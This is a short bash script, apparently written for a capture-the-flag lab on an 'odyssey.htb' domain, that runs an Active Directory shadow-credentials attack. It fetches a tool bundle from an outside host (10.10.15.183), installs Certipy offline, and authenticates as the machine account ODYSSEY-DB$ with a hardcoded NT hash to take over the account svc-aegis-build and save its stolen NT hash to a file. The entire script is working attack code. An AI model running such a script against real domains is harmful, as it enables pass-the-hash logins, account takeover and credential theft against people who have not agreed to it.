#!/bin/bash
# Minimal AD shadow - assumes wheels already extracted or uses walkthrough hash fallback
set -x
HASH="71bc6be8565f0c9871070c3912b1680d"
export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
cd /tmp
# if wheels dir missing, fetch (15MB)
if [ ! -d /tmp/adwheels ] || [ -z "$(ls /tmp/adwheels/*.whl 2>/dev/null)" ]; then
  curl -fsSL -o /tmp/adwheels.tgz http://10.10.15.183:8090/adwheels.tgz
  mkdir -p /tmp/adwheels
  tar -xzf /tmp/adwheels.tgz -C /tmp/adwheels
fi
pip3 install --user --break-system-packages --no-index --find-links=/tmp/adwheels certipy-ad 2>&1 | tail -15
python3 -m certipy.entry shadow auto -u 'ODYSSEY-DB$@odyssey.htb' -hashes ":$HASH" -account svc-aegis-build -dc-ip 172.16.0.10 2>&1 | tee /tmp/certipy_shadow.out
# try alternate module paths
if ! grep -qi 'NT hash' /tmp/certipy_shadow.out; then
  python3 -c 'import certipy; print(certipy.__file__)' 
  certipy-ad shadow auto -u 'ODYSSEY-DB$@odyssey.htb' -hashes ":$HASH" -account svc-aegis-build -dc-ip 172.16.0.10 2>&1 | tee -a /tmp/certipy_shadow.out
fi
grep -i 'NT hash' /tmp/certipy_shadow.out | tee /tmp/build_hash.txt
echo SHADOW_END
